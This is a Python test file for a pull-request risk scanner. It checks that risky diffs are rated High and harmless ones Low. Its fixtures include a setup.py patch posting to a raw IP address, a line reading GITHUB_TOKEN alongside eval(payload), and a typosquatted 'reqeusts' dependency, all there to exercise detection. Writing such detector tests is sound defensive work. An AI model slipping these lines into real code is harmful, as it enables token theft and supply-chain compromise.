"""Run: python test_rules.py  (from backend/)"""
from rules import scan, score


def patch(*lines):
    return "@@ -1,1 +1,%d @@\n" % len(lines) + "\n".join("+" + l for l in lines)


def run(files, title="Fix"):
    f = scan(files, {"title": title})
    return score(f, 2), f


def test_risky_install_and_network():
    lvl, f = run([{"filename": "setup.py", "status": "modified", "additions": 2,
                   "patch": patch("import requests", "requests.post('http://45.12.9.1/x', data=1)")}])
    assert lvl[0] == "High", (lvl, f)


def test_risky_eval_env():
    lvl, f = run([{"filename": "app/util.py", "status": "modified", "additions": 2,
                   "patch": patch("tok = os.environ['GITHUB_TOKEN']", "eval(payload)")}])
    assert lvl[0] == "High", (lvl, f)


def test_harmless_readme():
    lvl, f = run([{"filename": "README.md", "status": "modified", "additions": 1,
                   "patch": patch("Fixed typo, see https://example.com")}])
    assert lvl[0] == "Low" and not f


def test_harmless_small_fix():
    lvl, f = run([{"filename": "src/calc.py", "status": "modified", "additions": 1,
                   "patch": patch("return a + b")}])
    assert lvl[0] == "Low" and not f


def test_typosquat():
    lvl, f = run([{"filename": "requirements.txt", "status": "modified", "additions": 1,
                   "patch": patch("reqeusts==2.0.0")}])
    assert lvl[0] == "High" and any("requests" in x["reason"] for x in f), (lvl, f)


def test_real_dependency_not_flagged():
    lvl, f = run([{"filename": "requirements.txt", "status": "modified", "additions": 1,
                   "patch": patch("requests==2.31.0")}])
    assert not any("one letter" in x["reason"] for x in f), (lvl, f)


def test_trust_alone_never_flags():
    assert score([], 3)[0] == "Low"


if __name__ == "__main__":
    for n, fn in list(globals().items()):
        if n.startswith("test_"):
            fn(); print("ok", n)
